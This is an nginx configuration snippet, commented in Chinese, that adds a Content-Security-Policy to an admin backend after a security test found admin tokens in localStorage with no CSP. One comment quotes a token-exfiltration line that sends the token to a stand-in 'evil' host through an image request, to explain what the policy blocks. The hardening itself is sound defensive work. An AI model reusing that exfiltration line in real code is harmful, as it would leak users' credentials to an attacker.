# 运营后台（:8081）的安全响应头 = 通用四件套 + 后台专用 CSP。
# 凡是自己加了 add_header 的 location 都要 include 本片段，否则该 location 会丢掉
# server 层继承的全部 add_header（nginx add_header 的继承规则）。
include /etc/nginx/conf.d/_sec.inc;

# CSP（2026-08-05 安全测试报告项「Token 存于 localStorage 且缺少 CSP」）。
# 报告担心的链路是：出现 XSS → 脚本读走 localStorage 里的管理员 Token → 发往攻击者服务器。
# connect-src 'self' 掐断 fetch/XHR/EventSource 外发，img-src 不含外部源掐断
# `new Image().src='//evil/?t='+token` 这条经典外带通道，script-src 'self' 挡住外部脚本加载。
#
# script-src 保留 'unsafe-inline'：Next.js 的水合载荷是内联 <script>，去掉即整页打挂。
# 要做到真正的严格 CSP 需给 admin 加 Next.js middleware 逐请求下发 nonce——单列一项，未做。
# 后台无任何外部图片（服务商 logo 是文字徽章）、无 iframe、无外部表单提交，故以下均可收紧。
add_header Content-Security-Policy "default-src 'self'; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; worker-src 'self' blob:" always;
